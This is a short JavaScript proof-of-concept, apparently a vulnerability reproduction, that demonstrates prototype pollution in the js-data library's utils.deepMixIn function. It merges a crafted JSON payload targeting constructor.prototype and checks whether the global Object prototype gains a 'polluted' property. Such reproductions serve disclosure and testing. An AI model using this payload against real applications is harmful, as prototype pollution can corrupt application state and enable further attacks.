var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const {utils} = require('js-data');
const source = JSON.parse('{"constructor": {"prototype": {"polluted":"yes"}}}');
utils.deepMixIn(obj, source);
console.log({}.polluted);